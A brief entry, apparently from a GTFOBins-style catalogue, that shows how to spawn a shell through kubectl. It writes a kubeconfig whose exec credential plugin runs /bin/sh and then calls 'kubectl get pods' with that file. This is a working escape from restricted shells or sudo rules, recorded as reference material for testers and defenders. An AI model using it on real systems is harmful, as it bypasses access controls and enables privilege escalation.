name: GTFOBins · kubectl (shell)
command:
cat >/path/to/temp-file <<EOF
clusters:
- cluster:
    server: https://x
  name: x
contexts:
- context:
    cluster: x
    user: x
  name: x
current-context: x
users:
- name: x
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      interactiveMode: Always
      command: /bin/sh
      args:
        - '-c'
        - '/bin/sh 0<&2 1>&2'
EOF

kubectl get pods --kubeconfig=/path/to/temp-file
description: Use kubectl to shell via GTFOBins.
